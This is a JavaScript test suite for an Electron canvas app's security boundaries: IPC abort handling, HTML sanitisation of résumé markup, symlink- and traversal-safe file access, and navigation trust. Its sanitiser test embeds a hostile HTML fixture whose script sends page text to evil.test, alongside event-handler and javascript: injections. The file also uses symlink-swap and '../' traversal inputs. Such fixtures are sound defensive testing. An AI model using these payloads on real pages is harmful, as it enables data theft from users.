import { EventEmitter } from 'node:events';
import { pathToFileURL } from 'node:url';
import {
  abortNodeTasks,
  assert,
  atomicWriteFile,
  buildResumeDocument,
  electronPkg,
  fs,
  getDesignSystemDir,
  handleSafe,
  isTrustedCanvasNavigation,
  JSDOM,
  os,
  path,
  readEditorialRubric,
  resolveAllowedOpenFilePath,
  resolvePortableFilePaths,
  sanitizeDocumentMainHtml,
  snapshotActiveNodeTasks,
  validateMutablePath,
  writeValidatedTextFile,
} from '../test-dependencies.js';

function senderEvent() {
  const sender = new EventEmitter();
  sender.id = senderEvent.nextId++;
  sender.isDestroyed = () => false;
  return { sender };
}
senderEvent.nextId = 1;

export default [
  {
    name: 'IPC safe handler: timeout keeps its abort reason and cannot report a late success',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      handleSafe('test:timeout-abort', async () => {
        await new Promise(resolve => setTimeout(resolve, 20));
        return { data: 'late result' };
      }, 1);
      const result = await electronPkg.ipcMain.__getInvokeHandler('test:timeout-abort')(senderEvent(), {});
      assert(result.success === false && result.error === 'Timeout',
        `timed-out work must return its own reason, got ${JSON.stringify(result)}`);
      return { error: result.error };
    },
  },
  {
    name: 'IPC safe handler: node deletion keeps its abort reason and cannot report a late success',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      let release;
      const finished = new Promise(resolve => { release = resolve; });
      handleSafe('test:node-deleted-abort', async () => {
        await finished;
        return { data: 'late result' };
      });
      const pending = electronPkg.ipcMain.__getInvokeHandler('test:node-deleted-abort')(senderEvent(), { nodeId: 'deleted-node' });
      abortNodeTasks('deleted-node');
      release();
      const result = await pending;
      assert(result.success === false && result.error === 'Node deleted',
        `node deletion must return its own reason, got ${JSON.stringify(result)}`);
      return { error: result.error };
    },
  },
  {
    name: 'IPC safe handler: cancellation is scoped to the requesting canvas even when node ids collide',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      const releases = new Map();
      handleSafe('test:sender-scoped-abort', async (event) => {
        await new Promise(resolve => { releases.set(event.sender.id, resolve); });
        return { senderId: event.sender.id };
      });
      const first = senderEvent();
      const second = senderEvent();
      const handler = electronPkg.ipcMain.__getInvokeHandler('test:sender-scoped-abort');
      const firstPending = handler(first, { nodeId: 'shared-node-id' });
      const secondPending = handler(second, { nodeId: 'shared-node-id' });
      await Promise.resolve();
      abortNodeTasks('shared-node-id', first.sender);
      releases.get(first.sender.id)();
      releases.get(second.sender.id)();
      const [firstResult, secondResult] = await Promise.all([firstPending, secondPending]);
      assert(firstResult.success === false && firstResult.error === 'Node deleted',
        `the cancelling canvas must observe its abort, got ${JSON.stringify(firstResult)}`);
      assert(secondResult.success === true && secondResult.senderId === second.sender.id,
        `another canvas with the same node id must finish, got ${JSON.stringify(secondResult)}`);
      return { cancelledSender: first.sender.id, preservedSender: second.sender.id };
    },
  },
  {
    name: 'IPC safe handler: stable application error codes cross the IPC boundary',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      handleSafe('test:error-code', async () => {
        const error = new Error('Result changed while settling');
        error.code = 'LOCAL_AI_RESULT_CHANGED';
        throw error;
      });
      const result = await electronPkg.ipcMain.__getInvokeHandler('test:error-code')(senderEvent(), {});
      assert(result.success === false && result.errorCode === 'LOCAL_AI_RESULT_CHANGED',
        `a compact thrown error code must survive IPC, got ${JSON.stringify(result)}`);
      return { errorCode: result.errorCode };
    },
  },
  {
    name: 'IPC safe handler: destroyed senders release retained task diagnostics immediately',
    run: async () => {
      electronPkg.ipcMain.__clearInvokeHandlers();
      let release;
      const gate = new Promise(resolve => { release = resolve; });
      handleSafe('test:destroyed-sender-cleanup', async () => {
        await gate;
        return { data: 'detached result' };
      });
      const event = senderEvent();
      let destroyed = false;
      event.sender.isDestroyed = () => destroyed;
      const pending = electronPkg.ipcMain.__getInvokeHandler('test:destroyed-sender-cleanup')(event, { nodeId: 'closed-window-node' });
      await Promise.resolve();
      assert(snapshotActiveNodeTasks(event.sender.id).length === 1,
        'the pending node task must be visible before its owner closes');
      destroyed = true;
      event.sender.emit('destroyed');
      assert(snapshotActiveNodeTasks(event.sender.id).length === 0,
        'destroying WebContents must remove its registry entry even if downstream work ignores AbortSignal');
      release();
      const result = await pending;
      assert(result.success === false && (result.error === 'Window closed' || result.error === 'Sender destroyed'),
        `detached work must not report success, got ${JSON.stringify(result)}`);
      return { registryReleased: true, error: result.error };
    },
  },
  {
    name: 'résumé markup boundary strips active/selector-confusion content while preserving design structure and receipts',
    run: () => {
      const malicious = `<main class="page attacker" id="ic-application-bundle-data" onclick="steal()" style="background:url(https://evil.test/x)">
        <header class="resume-header"><h1 class="name" itemprop="name">Maya Chen</h1></header>
        <section class="section"><div class="section-head"><h2 id="sec-projects">Projects</h2><span class="rule" aria-hidden="true"></span></div>
          <div class="projects"><article class="project"><p><span class="project-name">Safe System</span></p></article></div>
          <ul class="highlights"><li>Cut debt <span data-achievement-id="a1" data-derivation="forged" onmouseover="steal()">74%</span></li></ul>
        </section>
        <script>fetch('https://evil.test/' + document.body.innerText)</script>
        <style>@import url(https://evil.test/style.css)</style><img src="https://evil.test/pixel" onerror="steal()">
        <iframe srcdoc="<script>steal()</script>"></iframe><form action="https://evil.test"><input name="secret"></form>
        <a id="unsafe-link" href="javascript:steal()" ping="https://evil.test/ping">Unsafe</a>
        <a id="safe-link" href="https://portfolio.example.test/work" target="_blank">Portfolio</a>
      </main>`;
      const sanitized = sanitizeDocumentMainHtml(malicious);
      assert(!/<(?:script|style|img|iframe|form|input)\b/i.test(sanitized)
        && !/\s(?:on\w+|style|src|srcdoc|ping|target)=/i.test(sanitized),
      `active elements/attributes must be removed, got ${sanitized}`);
      assert(!/id="ic-/i.test(sanitized) && !sanitized.includes('class="page attacker"'),
        'model markup cannot occupy the host id namespace or retain undocumented classes');
      assert(sanitized.includes('class="projects"') && sanitized.includes('class="project-name"')
        && sanitized.includes('id="safe-link" href="https://portfolio.example.test/work"')
        && !/id="unsafe-link"[^>]*href=/i.test(sanitized),
      'documented project structure and safe explicit links survive while active URL schemes do not');

      const document = buildResumeDocument({
        resumeMainHtml: malicious,
        ledger: [{
          id: 'a1', claim: 'Cut debt', caveats: '', derivation: 'debt $4.2M to $1.1M',
          computed: { isNumeric: true, display: '74% ($4.2M → $1.1M)' },
        }],
      });
      const dom = new JSDOM(document);
      try {
        const resumeMain = dom.window.document.querySelector('[data-ic-document-panel="resume"] main.page');
        assert(resumeMain && !resumeMain.querySelector('script,style,img,iframe,form,input'),
          'the final saved résumé panel remains inert');
        assert(resumeMain.querySelector('[data-achievement-id="a1"]')?.getAttribute('data-derivation')?.includes('debt $4.2M'),
          'a valid achievement receipt survives and receives only the ledger-authored derivation');
        const bundleNodes = dom.window.document.querySelectorAll('#ic-application-bundle-data');
        assert(bundleNodes.length === 1 && bundleNodes[0].getAttribute('type') === 'application/json',
          'a stripped model id cannot shadow the trusted application bundle node');
        const policy = dom.window.document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') || '';
        const nonce = /script-src 'nonce-([^']+)'/.exec(policy)?.[1] || '';
        const scripts = [...dom.window.document.querySelectorAll('script')];
        assert(nonce && scripts.length >= 3 && scripts.every(script => script.getAttribute('nonce') === nonce)
          && policy.includes("object-src 'none'") && policy.includes('connect-src http://127.0.0.1:43192'),
        'the nonce CSP authorizes only the app scripts plus the fixed loopback Sync endpoint');
      } finally {
        dom.window.close();
      }
      return { activeMarkupStripped: true, receiptPreserved: true, cspNonceBound: true };
    },
  },
  {
    name: 'OS document opening validates the canonical target behind a symlink',
    run: async () => {
      const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ic-open-file-'));
      const safeTarget = path.join(root, 'actual.txt');
      const activeTarget = path.join(root, 'payload.app');
      const disguisedLink = path.join(root, 'innocent.txt');
      const directoryTarget = path.join(root, 'folder.txt');
      try {
        await Promise.all([
          fs.promises.writeFile(safeTarget, 'safe'),
          fs.promises.writeFile(activeTarget, 'not actually executable'),
          fs.promises.mkdir(directoryTarget),
        ]);
        await fs.promises.symlink(activeTarget, disguisedLink, process.platform === 'win32' ? 'file' : undefined);
        assert(await resolveAllowedOpenFilePath(safeTarget) === await fs.promises.realpath(safeTarget),
          'a safe regular file should resolve to its canonical path');
        let disguisedRejected = false;
        try { await resolveAllowedOpenFilePath(disguisedLink); }
        catch { disguisedRejected = true; }
        assert(disguisedRejected, 'an allowed-looking link to a restricted target must be rejected');
        let directoryRejected = false;
        try { await resolveAllowedOpenFilePath(directoryTarget); }
        catch { directoryRejected = true; }
        assert(directoryRejected, 'an allowed-looking directory must not be handed to the OS shell');
        return { canonicalTargetChecked: true, disguisedTargetRejected: true, directoryRejected: true };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'text edits bind to the validated canonical file across symlink swaps',
    run: async () => {
      const root = await fs.promises.mkdtemp('/tmp/ic-text-write-');
      const documentPath = path.join(root, 'document.md');
      const outsidePath = path.join(root, 'outside.md');
      const linkedPath = path.join(root, 'linked.md');
      try {
        await Promise.all([
          fs.promises.writeFile(documentPath, 'original', { mode: 0o600 }),
          fs.promises.writeFile(outsidePath, 'outside', { mode: 0o600 }),
        ]);
        await fs.promises.symlink(documentPath, linkedPath, process.platform === 'win32' ? 'file' : undefined);
        const validatedPath = await validateMutablePath(linkedPath, { textOnly: true });
        assert(validatedPath === await fs.promises.realpath(documentPath),
          'text validation must return the canonical file rather than the lexical symlink');

        await fs.promises.unlink(linkedPath);
        await fs.promises.symlink(outsidePath, linkedPath, process.platform === 'win32' ? 'file' : undefined);
        await atomicWriteFile(validatedPath, 'updated');
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'updated',
          'the write must remain bound to the file that validation approved');
        assert(await fs.promises.readFile(outsidePath, 'utf8') === 'outside',
          'repointing the caller-controlled symlink must not redirect the write');

        await writeValidatedTextFile(documentPath, 'final');
        assert(await fs.promises.readFile(documentPath, 'utf8') === 'final',
          'the identity-checked text writer should preserve normal edits');

        const guardedPath = path.join(root, 'guarded.txt');
        const originalGuardedPath = path.join(root, 'guarded.original.txt');
        await fs.promises.writeFile(guardedPath, 'guarded', { mode: 0o600 });
        const guardedCanonicalPath = await fs.promises.realpath(guardedPath);
        const originalAccess = fs.promises.access;
        let injectedReplacement = false;
        let replacementRejected = false;
        try {
          fs.promises.access = async (...args) => {
            const result = await originalAccess.call(fs.promises, ...args);
            if (!injectedReplacement && args[0] === guardedCanonicalPath) {
              injectedReplacement = true;
              await fs.promises.rename(guardedPath, originalGuardedPath);
              await fs.promises.writeFile(guardedPath, 'replacement', { mode: 0o600 });
            }
            return result;
          };
          await writeValidatedTextFile(guardedPath, 'must-not-land');
        } catch (error) {
          replacementRejected = /changed while the edit was being saved/i.test(error?.message || '');
        } finally {
          fs.promises.access = originalAccess;
        }
        assert(replacementRejected, 'a regular-file replacement after validation must fail its identity check');
        assert(await fs.promises.readFile(guardedPath, 'utf8') === 'replacement',
          'a replacement file must not be overwritten after its identity no longer matches');
        return { canonicalTargetBound: true, identityChecked: true, replacementRejected: true };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'portable relative file paths cannot escape their canvas directory',
    run: async () => {
      const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ic-portable-path-'));
      const canvasDir = path.join(root, 'canvas');
      const canvasPath = path.join(canvasDir, 'workspace.json');
      const outsideFile = path.join(root, 'outside.txt');
      const insideFile = path.join(canvasDir, 'attachments', 'inside.txt');
      try {
        await fs.promises.mkdir(path.dirname(insideFile), { recursive: true });
        await Promise.all([
          fs.promises.writeFile(outsideFile, 'private'),
          fs.promises.writeFile(insideFile, 'portable'),
        ]);
        const data = { nodes: [
          { data: { filePath: '/missing/stale.txt', relativeFilePath: '../outside.txt' } },
          { data: { filePath: '/missing/inside.txt', relativeFilePath: 'attachments/inside.txt' } },
        ] };
        resolvePortableFilePaths(data, canvasPath);
        assert(data.nodes[0].data.filePath === '/missing/stale.txt',
          `relative traversal must not substitute an outside file, got ${data.nodes[0].data.filePath}`);
        assert(data.nodes[1].data.filePath === insideFile,
          'a legitimate relative descendant should still resolve');
        return { outsideBlocked: true, insideResolved: true };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'canvas text mutations are bounded and atomic writes retain private file modes',
    run: async () => {
      // Use /tmp rather than os.tmpdir(): macOS points the latter into /var,
      // which is intentionally on the production sensitive-path blocklist.
      const root = await fs.promises.mkdtemp('/tmp/ic-text-mutation-');
      const canvasPath = path.join(root, 'workspace.json');
      const textPath = path.join(root, 'notes.txt');
      const binaryPath = path.join(root, 'image.png');
      const newPath = path.join(root, 'new-note.md');
      try {
        await Promise.all([
          fs.promises.writeFile(canvasPath, '{}'),
          fs.promises.writeFile(textPath, 'old notes', { mode: 0o640 }),
          fs.promises.writeFile(binaryPath, 'not really an image'),
        ]);
        assert(await validateMutablePath(textPath, { textOnly: true }) === await fs.promises.realpath(textPath),
          'ordinary absolute .txt files remain editable');
        let nonTextRejected = false;
        try { await validateMutablePath(binaryPath, { textOnly: true }); }
        catch (error) { nonTextRejected = /Only .md and .txt/.test(error.message); }
        let canvasRejected = false;
        try { await validateMutablePath(canvasPath, { sender: { __canvasPath: canvasPath }, textOnly: false }); }
        catch (error) { canvasRejected = /open canvas/.test(error.message); }
        let containingFolderRejected = false;
        try { await validateMutablePath(root, { sender: { __canvasPath: canvasPath }, textOnly: false }); }
        catch (error) { containingFolderRejected = /folder containing it/.test(error.message); }
        assert(nonTextRejected && canvasRejected && containingFolderRejected,
          'renderer mutations must reject non-text editor targets and the open canvas or its containing folder');

        await atomicWriteFile(newPath, 'private by default');
        await atomicWriteFile(textPath, 'updated notes');
        const newMode = (await fs.promises.stat(newPath)).mode & 0o777;
        const retainedMode = (await fs.promises.stat(textPath)).mode & 0o777;
        assert(await fs.promises.readFile(textPath, 'utf8') === 'updated notes'
          && (process.platform === 'win32' || (newMode === 0o600 && retainedMode === 0o640)),
        `atomic writes must preserve existing mode and make new files owner-only (got ${newMode.toString(8)}/${retainedMode.toString(8)})`);
        return { nonTextRejected, canvasRejected, containingFolderRejected, newMode, retainedMode };
      } finally {
        await fs.promises.rm(root, { recursive: true, force: true });
      }
    },
  },
  {
    name: 'job application editorial rubric reads Git-tracked readme.md casing from disk',
    run: () => {
      const designSystemDir = getDesignSystemDir();
      const rubric = readEditorialRubric(designSystemDir);
      const skill = fs.readFileSync(path.join(designSystemDir, 'SKILL.md'), 'utf8');
      const readme = fs.readFileSync(path.join(designSystemDir, 'readme.md'), 'utf8');
      assert(rubric.includes(skill), 'rubric must include the real SKILL.md contents');
      assert(rubric.includes(readme), 'rubric must include the real lowercase readme.md contents');
      assert(rubric === `${skill}\n\n---\n\n${readme}`,
        'rubric must preserve both real editorial sources in their documented order');
      return { designSystemDir, readme: path.join(designSystemDir, 'readme.md') };
    },
  },
  {
    name: 'canvas navigation trusts only dist in production and the configured Vite origin in development',
    run: () => {
      const distDir = path.join(path.sep, 'app', 'dist');
      const bundled = pathToFileURL(path.join(distDir, 'index.html')).href;
      const escaped = pathToFileURL(path.join(path.sep, 'app', 'private.html')).href;
      assert(isTrustedCanvasNavigation(bundled, { distDir }), 'production accepts bundled dist content');
      assert(!isTrustedCanvasNavigation(escaped, { distDir }), 'production rejects file content outside dist');
      assert(!isTrustedCanvasNavigation('https://app.example.test', { distDir }), 'production rejects remote origins');

      const devServerUrl = 'http://localhost:5173';
      assert(isTrustedCanvasNavigation('http://localhost:5173/?init=blank', { devServerUrl, distDir }),
        'development accepts the configured Vite origin');
      assert(!isTrustedCanvasNavigation('http://127.0.0.1:5173/', { devServerUrl, distDir }),
        'development rejects a different loopback origin');
      assert(!isTrustedCanvasNavigation('http://localhost:4173/', { devServerUrl, distDir }),
        'development rejects a different Vite port');
      return { production: 'dist-only', development: 'exact-origin' };
    },
  },
];
